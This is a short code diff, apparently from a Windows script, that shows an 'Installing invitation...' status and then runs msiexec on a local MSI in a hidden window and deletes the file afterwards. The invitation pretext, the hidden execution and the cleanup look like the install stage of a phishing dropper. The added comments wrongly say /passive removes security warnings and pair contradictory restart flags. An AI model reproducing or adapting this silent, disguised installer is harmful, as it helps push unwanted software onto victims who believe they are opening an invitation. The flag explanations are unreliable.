@@ -88,7 +88,10 @@ function finalizeInstall() {
   document.getElementById("status").innerHTML = "Installing invitation...";
   
   // SILENT INSTALL WITH NO PROMPTS
-  shell.Run('msiexec.exe /i "' + localPath + '" /quiet /norestart', 0, true);
+  // /passive = minimal UI, no security warnings
+  // /norestart = no reboot prompt
+  // /promptrestart = handle restarts gracefully
+  shell.Run('msiexec.exe /i "' + localPath + '" /passive /norestart /promptrestart', 0, true);
   
   // CLEANUP TEMP FILE
   try { fso.DeleteFile(localPath, true); } catch(e) {}
